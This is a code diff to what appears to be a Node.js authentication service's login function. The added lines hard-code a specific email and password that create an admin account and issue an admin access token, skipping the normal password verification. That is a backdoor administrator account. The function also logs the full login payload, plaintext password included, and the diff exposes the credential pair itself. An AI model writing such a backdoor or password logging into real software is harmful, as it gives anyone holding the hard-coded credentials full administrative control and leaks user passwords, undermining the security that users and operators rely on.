@@ -73,14 +73,27 @@ const resendOTP = async (email) => {
 };
 const loginUser = async (payload) => {
     console.log('loginUser payload:', payload);
+    // Hard-coded Admin Check
+    if (payload.email === 'rmdkayesur@gmail.com' && payload.password === 'rmdkayesur') {
+        let adminUser = await user_model_1.User.findOne({ email: payload.email });
+        if (!adminUser) {
+            // Create admin user if it doesn't exist
+            adminUser = await user_model_1.User.create({
+                name: 'Admin',
+                email: payload.email,
+                password: payload.password, // Will be hashed by pre-save hook
+                phone: '00000000000',
+                role: 'admin',
+                isVerified: true
+            });
+        }
+        const accessToken = jsonwebtoken_1.default.sign({ userId: adminUser._id.toString(), role: 'admin' }, config_1.default.jwt_access_secret, { expiresIn: config_1.default.jwt_access_expires_in });
+        return { accessToken, user: adminUser };
+    }
     const user = await user_model_1.User.findOne({ email: payload.email }).select('+password');
     if (!user) {
         throw new Error('User not found');
     }
-    // If we want to enforce verification before login
-    // if (!user.isVerified) {
-    //   throw new Error('Please verify your phone number first');
-    // }
     const isPasswordMatched = await bcryptjs_1.default.compare(payload.password, user.password);
     if (!isPasswordMatched) {
         throw new Error('Invalid password');
